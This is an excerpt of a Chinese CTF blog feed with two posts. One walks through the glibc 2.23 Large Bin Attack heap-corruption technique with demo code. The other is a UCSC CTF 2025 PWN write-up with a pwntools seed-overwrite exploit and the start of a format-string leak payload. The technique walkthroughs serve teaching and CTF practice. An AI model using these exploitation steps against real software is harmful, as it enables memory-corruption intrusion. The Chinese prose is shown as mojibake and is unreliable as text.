alt="image-20250426203532614"></p><p>ç°åœ¨çš„å±€é¢å˜æˆäº† P1 è¿›å…¥äº†unsorted bin, P2 è¿›å…¥äº† large bin ï¼ŒP3ä¸º Allocated chunk ã€‚</p><p><u>ç¬¬å››æ­¥ï¼šé‡Šæ”¾P3ï¼Œä¸‰BINé¼ç«‹</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(p3);</span><br></pre></td></tr></table></figure><p><img src="/../PWN/LargeBinAttack/6.png" alt="image-20250426204107261"></p><p><u>ç¬¬äº”æ­¥ï¼šæ„é€ Large Bin Attack</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br></pre></td></tr></table></figure><p><img src="/../PWN/LargeBinAttack/7.png" alt="image-20250426212145734"></p><p><img src="/../PWN/LargeBinAttack/8.png" alt="image-20250426211737512"></p><p>å‡è®¾æœ‰æ¼æ´å¯ä»¥çº‚æ”¹è¦†å†™ P2 çš„ size ã€bk ä»¥åŠ bk_nextsize ï¼Œè¿™é‡Œæ˜¯å°† P2 çš„ size å˜æˆäº† 0x3f1 ï¼Œfd å˜æˆäº† 0 ï¼Œbk å˜æˆäº† stack_var1 -0x10 , fd_nextsize å˜æˆäº† 0  ï¼Œbk_nextsize å˜æˆäº† stack_var2 - 0x20 ã€‚</p><p>æ­¤æ—¶çš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/../PWN/LargeBinAttack/9.png" alt="image-20250426211703179"></p><p>ç”±äº bk å’Œ bk_nextsize çš„çº‚æ”¹ ï¼Œæ„é€ äº†ä¸¤ä¸ªç›®æ ‡åœ°å€é™„è¿‘çš„fake_chunk ã€‚</p><p><img src="/../PWN/LargeBinAttack/10.png" alt="image-20250426213622567"></p><p>ä½†æ˜¯æ­¤æ—¶çš„ç›®æ ‡åœ°å€çš„å€¼è¿˜æ²¡æœ‰è¢«ä¿®æ”¹æˆå †åœ°å€ï¼Œè¿˜éœ€è¦è¿›è¡Œæœ€åä¸€æ­¥æ“ä½œã€‚</p><p><u>ç¬¬å…­æ­¥ï¼šå°†P3æ”¾å…¥ large bin å†…ï¼Œè§¦å‘ large bin attck ã€‚</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ­¥åŒä¸Šä¸€æ­¥ä¸€æ ·é‡è¦ ï¼Œå‰é¢æåˆ°è¿‡ ï¼ŒLarge Bin Attack æ— éå°±æ˜¯åˆ©ç”¨å¤§å †å—æ’åºæœºåˆ¶ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦æŠŠP3æ”¾å…¥large binåï¼Œæ‰èƒ½è§¦å‘ Large Bin Attackã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦malloc(0x90)å†æ¬¡è§¦å‘unsorted binéå†ï¼Œé¦–å…ˆæŒ‰ç…§ç¨‹åºè‚¯å®šæ˜¯å…ˆæ£€æŸ¥fast binã€small binï¼Œè¿™é‡Œé¢æ²¡æœ‰ï¼Œäºæ˜¯å°±æ¥ç€æ£€æŸ¥unsorted bin(æ­¤æ—¶åªæœ‰P1å’ŒP3åœ¨unsorted binä¸­)ï¼Œæ ¹æ®å…ˆè¿›å…ˆå‡ºåŸåˆ™ï¼ŒæŠŠ P1 ç»™å–å‡ºæ¥ï¼Œåˆ¤æ–­ä¸æ»¡è¶³åˆé€‚å¤§å°ï¼Œç›´æ¥ä¾ç…§å¤§å°é˜ˆå€¼ï¼Œæ”¾å…¥small binä¸­ï¼Œç„¶åæŠŠ P3 æ‹¿å‡ºæ¥ï¼Œåˆ¤æ–­ä¸æ»¡è¶³åˆé€‚å¤§å°ï¼Œæ”¾å…¥ large bin ä¸­ï¼Œéå†ç»“æŸï¼Œæ²¡æœ‰å‘ç°åˆé€‚å †å—ï¼Œäºæ˜¯ä¾æ¬¡æ£€æŸ¥small binï¼Œå’Œ large bin ï¼Œ ç”±äº small bin ä¸­åªæœ‰P1 ï¼Œäºæ˜¯ P1 åˆè¢«æ‹¿å‡ºæ¥åˆ†é…å †å—ï¼Œè€Œåé‡æ–°ä¸¢å…¥äº† unsorted bin ä¸­(P1å¥½å¯æ€œğŸ¥¹)ï¼Œè€Œ P3 ç•™åœ¨äº† large bin å†…ã€‚</p><p>P3 è¿›å…¥äº† large bin å¯¼è‡´è§¦å‘äº† Large Bin Attack ï¼Œä¸ºä»€ä¹ˆä¼šè§¦å‘è¿™ä¸ªå‘¢ï¼Ÿè®©æˆ‘ä»¬æ¥æ ¹æ®GLIBC-2.23çš„æºç è¿›è¡Œåˆ†æã€‚</p><p><strong>å…³äºè¿›å…¥large binçš„å¤§å †å—æ’åºç›¸å…³æºç åœ¨ä¸‹ï¼š</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">              fwd = fwd-&gt;fd; </span><br><span class="line">          <span class="keyword">else</span> </span><br><span class="line">          &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          bck = fwd-&gt;bk;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>å†…å®¹ç¨å¾®æœ‰ä¸€ç‚¹å¤š ï¼Œæˆ‘ä»¬æŠŠæºç æ‹†è§£åˆ†æ ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">            fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">            assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯è¿™ä¸ªwhileå¾ªç¯éƒ¨åˆ†ï¼Œè¿™é‡Œå¯¹è¿›å…¥large binçš„å †å—sizeè¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœè¿›å…¥large binçš„sizeå°äºå‰ä¸€ä¸ªå †å—çš„sizeï¼Œå°±ä¼šæ‰§è¡Œwhileå¾ªç¯é‡Œé¢çš„å†…å®¹ï¼ˆå…¶å®é‡Œé¢å°±æ˜¯ä¸€ä¸ªç®€å•çš„å¾ªç¯æ’åºæ³•ï¼Œä¼šæ ¹æ®åˆ¤æ–­ï¼ŒæŠŠè¿›å…¥large binçš„å †å—éšç€å¾ªç¯ä¸æ–­ç½®å‰ï¼Œç›´åˆ°ä¸å°äºå‰é¢ä¸€ä¸ªå †å—çš„sizeä¸ºæ­¢â€”â€”Large Binç”±å¤§åˆ°å°æ’åºï¼‰ï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬çº‚æ”¹äº† P2 çš„sizeä¸º 0x3f1 , å¹¶ä¸” P3 &#x3D; 0X510 ï¼Œæ‰€ä»¥P3å¤§äºP2 , ä¸æ»¡è¶³whileå¾ªç¯çš„æ¡ä»¶,äºæ˜¯æˆ‘ä»¬è·³è¿‡whileå¾ªç¯ï¼Œæ¥åˆ°äº†ä¸‹é¢ä¸€ä¸ªéƒ¨åˆ†ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">    fwd = fwd-&gt;fd; </span><br></pre></td></tr></table></figure><p>è¿™ä¸€éƒ¨åˆ†æ˜¯åˆ¤æ–­è¿›å…¥Large Binå †å—çš„size ä¸å‰é¢ä¸€ä¸ªç©ºé—²å †å—çš„sizeæ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰çš„è¯å°±ä¼šæ‰§è¡Œifè¯­å¥é‡Œé¢çš„å†…å®¹ï¼Œä½†æ˜¯å¾ˆæ˜¾ç„¶ï¼Œè¿›å…¥large binçš„ P3 æ˜æ˜¾ä¸ç­‰äº P2ï¼Œæ‰€ä»¥è·³è¿‡äº† if è¯­å¥é‡Œé¢çš„å†…å®¹ï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªéƒ¨åˆ†ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> </span><br><span class="line">     &#123;</span><br><span class="line">         victim-&gt;fd_nextsize = fwd;</span><br><span class="line">         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">         fwd-&gt;bk_nextsize = victim;</span><br><span class="line">         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">     &#125;</span><br><span class="line">     bck = fwd-&gt;bk;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€éƒ¨åˆ†æ˜¯æˆ‘ä»¬å¿…é¡»è¦æ‰§è¡Œçš„éƒ¨åˆ†äº†ï¼Œå¾ˆæ˜æ˜¾æ˜¯å¯¹victim(P3)ç»“æ„çš„ä¸€äº›èµ‹å€¼æ“ä½œï¼Œè¿™æ®µæºç é€ æˆäº†ä»¥ä¸‹å½±å“ï¼š</p><p><img src="/../PWN/LargeBinAttack/11.png" alt="image-20250426225014983">ï¼ˆçº¢è‰²éƒ¨åˆ†æ˜¯å‰ä¸‰æ¡æºç æ”¹å˜çš„éƒ¨åˆ†)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br></pre></td></tr></table></figure><p>å°† P3 çš„ fd_nexsize å˜æˆäº† P2 çš„åœ°å€</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br></pre></td></tr></table></figure><p>å°† P3 çš„ bk_nextsize å˜æˆäº† P2 çš„ bk_nextsize ä¹Ÿå°±æ˜¯ stack_var2 - 0x20</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fwd-&gt;bk_nextsize = victim;</span><br></pre></td></tr></table></figure><p>å°† P2 çš„ bk_nextsize å˜æˆäº† P3 çš„åœ°å€</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p>**å…³é”®çš„ä¸€æ­¥ï¼š**å°† P3 çš„ bk_nextsize ä¹Ÿå°±æ˜¯ stack_var2 - 0x20 çš„ fake_chunk çš„ fd_nextsize(stack_var2)å˜æˆäº† P3 çš„åœ°å€ ï¼</p><p><img src="/../PWN/LargeBinAttack/12.png" alt="image-20250426225937386"></p><p>ç»†å¿ƒçš„ä½ ç°åœ¨å¯ä»¥å‘ç°ï¼ŒLarge Bin Attack å·²ç»å®ç°äº† ï¼Œæˆ‘ä»¬æŠŠ stack_var2 ç›®æ ‡åœ°å€å†™å…¥äº†æˆ‘ä»¬P3å †å—çš„åœ°å€ ã€‚</p><p>ä½†æ˜¯ Large Bin Attack è¿˜æ²¡æœ‰ç»“æŸ ï¼Œæˆ‘ä»¬æ¥ç€å¾€ä¸‹é¢çœ‹ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p><img src="/../PWN/LargeBinAttack/13.png" alt="image-20250426231400362"></p><p>ä¸Šé¢æ˜¯åœ¨æ‰§è¡Œä»£ç ä¹‹å‰çš„ç»“æ„ï¼ˆå›¾ä¸€ï¼‰</p><p><img src="/../PWN/LargeBinAttack/14.png" alt="image-20250426232438420"></p><p>ä¸Šé¢æ˜¯åœ¨æ‰§è¡Œä»£ç ä¹‹åçš„ç»“æ„ï¼ˆå›¾äºŒï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk = bck;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“ P3 åœ¨è¿›å…¥large binæ˜¯æ’å…¥åˆ° P2 ä¹‹åçš„ï¼ˆçœ‹å›¾ä¸€æƒ³è±¡æ’å…¥ P3 ï¼‰</p><p>ä»£ç å°† P3 çš„ bk å˜æˆäº†è¿›å…¥large binæ—¶ç›¸åŒå¤§å°çš„åé¢ä¸€ä¸ªå †å—ä¹Ÿå°±æ˜¯ stack_var1 - 0x10 ï¼ˆè¿™é‡Œè™½ç„¶ä¹‹å‰ P2 çº‚æ”¹äº†å¤§å°ï¼Œä½†æ˜¯å®ƒçš„åˆ¤å®šè¿˜æ˜¯åœ¨ 0x510è¿™ä¸ªèŒƒå›´ï¼Œæ‰€ä»¥å¯ä»¥çœ‹ä½œæ˜¯å’Œ P3 åœ¨åŒä¸€ä¸ª Bin é‡Œé¢ï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;fd = fwd;</span><br></pre></td></tr></table></figure><p>P3 çš„ fd å˜æˆäº† P3 çš„å‰é¢ä¸€ä¸ªå †å—ä¹Ÿå°±æ˜¯ P2 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fwd-&gt;bk = victim;</span><br></pre></td></tr></table></figure><p>å°† P2 çš„ bk å˜æˆäº† P3</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>å°† stack_var1 - 0x10 çš„ fd ä¹Ÿå°±æ˜¯ stack_var1 å˜æˆäº† P3 !</p><p><img src="/../PWN/LargeBinAttack/15.png" alt="image-20250426233127191"></p><p><strong><u>Large Bin Attack æˆåŠŸå®ç°ï¼</u></strong></p><p>æˆåŠŸçº‚æ”¹äº†ä»»æ„åœ°å€çš„å€¼ä¸ºå †å—çš„åœ°å€ã€‚</p><p>åç»­è¿˜ä¼šæ›´æ–°å…³äº Largin Bin Attack ç›¸å…³é¢˜å‹çš„è®²è§£ï¼Œåœ¨è¿™ç¯‡æ–‡ç«  ã€‚ã€‚ã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†å½’çº³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Large Bin Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UCSC CTF 2025 WP</title>
      <link href="/2025/04/22/UCSC%20CTF%202025%20WP%20----%20PWN/"/>
      <url>/2025/04/22/UCSC%20CTF%202025%20WP%20----%20PWN/</url>
      
        <content type="html"><![CDATA[<h2 id="UCSC-CTF-2025-WP-â€”-PWN"><a href="#UCSC-CTF-2025-WP-â€”-PWN" class="headerlink" title="UCSC CTF 2025 WP â€”- PWN"></a>UCSC CTF 2025 WP â€”- PWN</h2><h3 id="BoFido"><a href="#BoFido" class="headerlink" title="BoFido"></a>BoFido</h3><p><img src="/../WP/UCSC2025/1.png" alt="1"></p><p>å¸¸è§„æ£€æŸ¥ï¼š 64ä½ç¨‹åº NXä¿æŠ¤</p><p>IDA:</p><p>mainï¼ˆï¼‰å‡½æ•°ï¼š</p><p><img src="/../WP/UCSC2025/2.png" alt="2"></p><p>ä¸»å‡½æ•°çš„ä»£ç é€»è¾‘éå¸¸çš„ç®€å• å¾ªç¯åæ¬¡ æ¯æ¬¡å¾ªç¯åˆ›é€ ä¸‰ä¸ªéšæœºæ•° è®©ç©å®¶è¿›è¡ŒçŒœæ•°æ¸¸æˆ</p><p>ç¨‹åºä¸­è¿˜å­˜åœ¨æ˜æ˜¾çš„system(â€œ&#x2F;bin&#x2F;shâ€)åé—¨å‡½æ•°è°ƒç”¨ </p><p>è¦æƒ³è¿›å…¥è¿™ä¸ªåé—¨å‡½æ•° æˆ‘ä»¬å°±å¿…é¡»è¦æ»¡è¶³ v14 &#x3D;&#x3D; 10 è¿™ä¸€ä¸ªæ¡ä»¶</p><p>è€Œ v14 è¿™ä¸ªå˜é‡åœ¨ç¨‹åºä¸­çš„ä½œç”¨æ˜¯ç»Ÿè®¡å…¨çŒœä¸­çš„æ¬¡æ•° æ¯ä¸ªå›åˆä¸‰ä¸ªæ•°å­—å…¨éƒ¨çŒœä¸­ v14 çš„å€¼å°±ä¼šåŠ ä¸€ ä½†ç”±äºè¿›è¡ŒçŒœæ•°çš„å›åˆåªæœ‰åæ¬¡ æ‰€ä»¥æˆ‘ä»¬è‹¥æƒ³è¦è¿›è¡Œåé—¨å‡½æ•°è°ƒç”¨ æœ€ç›´æ¥çš„æ–¹æ³•å°±å¿…é¡»è¦æ¯ä¸€ä¸ªå›åˆéƒ½æŠŠä¸‰ä¸ªæ•°ç»™çŒœå¯¹ </p><p>ä½†æ˜¯å¦‚æœæ˜¯ä¸€ç›´ä¹±çŒœ æ˜æ˜¾æ˜¯ä¸å¤ªç°å®ï¼ˆæ¯”å½©ç¥¨ä¸­å¤§å¥–çš„æ¦‚ç‡è¿˜ä½ï¼‰<strong>æ‰€ä»¥è¿™å°±éœ€è¦æˆ‘ä»¬æ¥æ§åˆ¶èµŒå±€çš„ä¸­å¥–ç‡</strong> ä»è€Œè¾¾åˆ°æŠŠæŠŠå…¨çŒœä¸­çš„ç›®çš„</p><p><strong><u>é‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•åˆ©ç”¨æ¼æ´è¿›è¡Œå®ç°å‘¢ï¼Ÿ</u></strong></p><p><img src="/../WP/UCSC2025/3.png" alt="image-20250422234155656"></p><p>æˆ‘ä»¬æƒ³è¦æ§åˆ¶ä¸­å¥–ç‡ å°±å¿…é¡»è¦çŸ¥é“ éšæœºæ•°æ˜¯å¦‚ä½•è¿›è¡Œç”Ÿæˆçš„ï¼š</p><hr><ul><li>C è¯­è¨€æä¾›äº† <code>rand()</code> å‡½æ•°æ¥ç”Ÿæˆéšæœºæ•°ï¼Œè¯¥å‡½æ•°é€šå¸¸åŸºäºçº¿æ€§åŒä½™æ³•ç­‰ç®—æ³•å®ç°ã€‚æ¯æ¬¡è°ƒç”¨ <code>rand()</code> å‡½æ•°æ—¶ï¼Œå®ƒä¼šæ ¹æ®å†…éƒ¨çš„ç§å­å’Œç®—æ³•ç”Ÿæˆä¸‹ä¸€ä¸ªéšæœºæ•°ã€‚</li></ul><hr><p>ä½†æ˜¯å¦‚æœç¨‹åºæ¯æ¬¡éƒ½åˆ©ç”¨ç›¸åŒçš„ç§å­ï¼Œé‚£ä¹ˆç”Ÿæˆçš„éšæœºæ•°åºåˆ—ä¹Ÿä¼šç›¸åŒï¼Œè¿™æ ·å°±æ— æ³•å¾—åˆ°çœŸæ­£çš„éšæœºæ•°ï¼Œæ‰€ä»¥é€šå¸¸æˆ‘ä»¬éƒ½ä¼šä»¥å½“å‰æ—¶é—´ä½œä¸ºç§å­ï¼Œå› ä¸ºæ—¶é—´æ˜¯æ— æ—¶æ— åˆ»å‘ç”Ÿå˜åŒ–çš„ï¼Œè¿™æ ·ç”Ÿæˆçš„æ•°å€¼æ‰ä¼šæ»¡è¶³éšæœºæ€§ã€‚</p><p><strong>seed &#x3D; time(0LL)</strong></p><p>è¿™è¡Œä»£ç çš„ä½œç”¨æ˜¯åˆå§‹åŒ–æ—¶é—´çš„ç§å­ è¿™æ ·æˆ‘ä»¬å¾—åˆ°çš„éšæœºæ•°å°±æ˜¯å®Œå…¨éšæœºçš„äº†</p><p>è¿™æ ·å°±ä¸æ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œå¯¹èµŒå±€çš„æŠŠæ§ </p><p>è½¬å¿µä¸€æƒ³ï¼Œå¦‚æœç”Ÿæˆéšæœºæ•°æ˜¯æ ¹æ®å†…éƒ¨çš„ç§å­å’Œå›ºå®šçš„ç®—æ³•å†³å®šçš„ï¼Œè¿™ä¸ªç§å­å› ä¸ºç¨‹åºè¿›è¡Œäº†æ—¶é—´åˆå§‹åŒ–ï¼Œå¯¼è‡´ç§å­åœ¨ä¸æ–­å˜åŒ–ï¼Œä½†å¦‚æœæˆ‘ä»¬åœ¨å…¶ç”Ÿæˆæ—¶é—´çš„ç§å­ä¹‹åï¼Œå¯¹seedè¿›è¡Œä¸€ä¸ªè¦†ç›–ï¼ŒæŠŠå®ƒè¦†ç›–ä¸ºä¸€ä¸ªå›ºå®šå¤§å°çš„å€¼ï¼Œ<strong><u>è¿™æ ·æˆ‘ä»¬ç”Ÿæˆçš„éšæœºæ•°åºåˆ—å°±ä¼šå˜å¾—æœ‰è¿¹å¯å¾ª</u></strong></p><p><u>å¦‚æœä½ èƒ½å¤Ÿé¢„çŸ¥æœªæ¥ï¼Œè¿™æ ·çš„èµŒå±€è¿˜ä¼šå­˜åœ¨å¤±è¯¯å—â€¦..</u></p><h5 id="åšé¢˜æ€è·¯ï¼š"><a href="#åšé¢˜æ€è·¯ï¼š" class="headerlink" title="åšé¢˜æ€è·¯ï¼š"></a>åšé¢˜æ€è·¯ï¼š</h5><p>ç”±äºç¨‹åºç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ª0x25å­—èŠ‚çš„è¾“å…¥ç‚¹ æ°å¥½è¿™ä¸ªè¾“å…¥ç‚¹å­˜åœ¨ä¸€ä¸ªæ¼æ´ è®©æˆ‘ä»¬è¿›è¡Œä¸€ä¸ªåˆ©ç”¨</p><p><img src="/../WP/UCSC2025/4.png" alt="image-20250422235747015"></p><p>å¯ä»¥çœ‹åˆ°è¾“å…¥ç‚¹ buf å’Œéšæœºæ•°ç§å­ seed éƒ½å­˜åœ¨äºæ ˆä¸Šï¼Œå¹¶ä¸”ç›¸è·0x20å­—èŠ‚ï¼ˆæ°å¥½åœ¨0x25è¾“å…¥èŒƒå›´ä»¥å†…ï¼‰åªè¦æˆ‘ä»¬å¡«å……æ•°æ®0x21ä¸ªå­—èŠ‚æŠŠseedè¦†ç›–æˆä¸€ä¸ªå›ºå®šçš„å€¼ è¿™æ ·éšæœºæ•°åºåˆ—ä¹Ÿä¼šå›ºå®š</p><p><img src="/../WP/UCSC2025/5.png" alt="image-20250423000924364"></p><p>æˆ‘é€‰æ‹©ç›´æ¥å¡«å……0x21ä¸ªçš„aå­—èŠ‚ï¼Œç¬¬ä¸€æ¬¡è¿è¡Œç¨‹åºè®°ä¸‹åä¸ªå›åˆçš„å¹¸è¿æ•°å­—ï¼Œç¬¬äºŒæ¬¡è¿è¡Œç¨‹åºç›´æ¥æŒ‰ç¬¬ä¸€ä¸ªå›åˆçš„é¡ºåºæ‰“å°±å¯ä»¥ç›´æ¥æ‰“é€š</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter your name:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x21</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h3 id="userlogin"><a href="#userlogin" class="headerlink" title="userlogin"></a>userlogin</h3><p><img src="/../WP/UCSC2025/6.png" alt="image-20250423124813045"></p><p>å¸¸è§„æ£€æŸ¥ï¼š64ä½ NXä¿æŠ¤</p><p>IDA:</p><p>mainï¼ˆï¼‰å‡½æ•°ï¼š</p><p><img src="/../WP/UCSC2025/7.png" alt="image-20250423124845602"></p><p>mainï¼ˆï¼‰å‡½æ•°å’Œ generatePasswordï¼ˆï¼‰å‡½æ•°æ²¡æœ‰ä»€ä¹ˆä¸å¯¹åŠ²çš„åœ°æ–¹ æˆ‘ä»¬ç›´æ¥çœ‹loginï¼ˆï¼‰å‡½æ•°</p><p>loginï¼ˆï¼‰å‡½æ•°ï¼š</p><p><img src="/../WP/UCSC2025/8.png" alt="image-20250423125310204"></p><p>å­˜åœ¨ä¸€ä¸ªè¾“å…¥ç‚¹ï¼Œè¾“å…¥å¤§å°æ˜¯32å­—èŠ‚ï¼Œéšåstrcmpå‡½æ•°å¯¹è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œå¯¹ç…§</p><ol><li><p>supersecureuser</p><p>å¦‚æœè¾“å…¥çš„å­—ç¬¦ä¸²ä¸ºâ€œsupersecureuserâ€ï¼Œåˆ™è¿›å…¥userï¼ˆï¼‰å‡½æ•°</p></li><li><p>éšæœºå­—ç¬¦ä¸²</p><p>å¦‚æœè¾“å…¥çš„å­—ç¬¦ä¸²ä¸º a1 ï¼Œåˆ™è¿›å…¥rootï¼ˆï¼‰å‡½æ•°ï¼Œä½†æ˜¯ç”±äº a1 æ¶‰åŠåˆ°éšæœºæ•°ï¼Œæ‰€ä»¥ a1 å…·æœ‰ä¸ç¡®å®šæ€§ï¼Œå¾ˆéš¾å¯¹å…¶è¿›è¡Œé¢„æµ‹</p><h4 id="è§£æ³•ä¸€ï¼š"><a href="#è§£æ³•ä¸€ï¼š" class="headerlink" title="è§£æ³•ä¸€ï¼š"></a>è§£æ³•ä¸€ï¼š</h4><p>userï¼ˆï¼‰å‡½æ•°ï¼š</p></li></ol><p><img src="/../WP/UCSC2025/9.png" alt="image-20250423131703908"></p><p>userï¼ˆï¼‰å‡½æ•°å†…éƒ¨æœ‰ä¸€ä¸ªæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ å¹¶ä¸”ç”±äº mainï¼ˆï¼‰å‡½æ•°å†…forå¾ªç¯çš„å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥è¿ç»­è¿›å…¥ä¸‰æ¬¡ loginï¼ˆï¼‰å‡½æ•°ï¼Œä»è€Œæˆ‘ä»¬å°±æ‹¥æœ‰ä¸‰æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨çš„æœºä¼š</p><p>åŒæ—¶ç¨‹åºå­˜åœ¨shellï¼ˆï¼‰åé—¨å‡½æ•°ï¼š</p><p><img src="/../WP/UCSC2025/10.png" alt="image-20250423132447202"></p><h5 id="åšé¢˜æ€è·¯ï¼š-1"><a href="#åšé¢˜æ€è·¯ï¼š-1" class="headerlink" title="åšé¢˜æ€è·¯ï¼š"></a>åšé¢˜æ€è·¯ï¼š</h5><p>1.åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å‡ºè¿”å›åœ°å€</p><p>2.å°†è¿”å›åœ°å€å†™å…¥æ ˆä¸Š å¹¶æ”¹è¿”å›åœ°å€çš„å†…å®¹ä¸ºåé—¨å‡½æ•°çš„åœ°å€</p><p><img src="/../WP/UCSC2025/11.png" alt="image-20250423135436505"></p><p>æŒ‘é€‰äº†ä¸€ä¸ªæ ˆä¸Šçš„ä¸€ä¸ªåœ°å€ï¼Œæ‰“ç®—å¯¹è¿™ä¸ªåœ°å€è¿›è¡Œä¸€ä¸ªæ³„éœ²ï¼Œéšåè®¡ç®—å‡ºå®ƒä¸è¿”å›åœ°å€çš„å›ºå®šåç§»ï¼Œåˆ©ç”¨æ³„éœ²å‡ºæ¥çš„åœ°å€åŠ ä¸Šå›ºå®šåç§»ï¼Œå¾—åˆ°çš„ç»“æœå°±æ˜¯è¿”å›åœ°å€äº†</p><p><img src="/../WP/UCSC2025/12.png" alt="image-20250423135740277"></p><p>fmtarg å¯ä»¥è®¡ç®—å‡ºæ³„éœ²åœ°å€çš„åç§»æ˜¯ %7 </p><p>ç¬¬ä¸€æ®µpayloadå°±å¯ä»¥æ„é€ å‡ºæ¥äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;%7$p&#x27;</span><br></pre></td></tr></table></figure><p>è¿™æ®µpayloadå¯ä»¥ç›´æ¥æŠŠå†…å®¹ä½œä¸ºæŒ‡é’ˆæ³„éœ²å‡ºæ¥ è®¡ç®—å‡ºå›ºå®šåç§»ä¸º 0x38ï¼Œè¿™æ 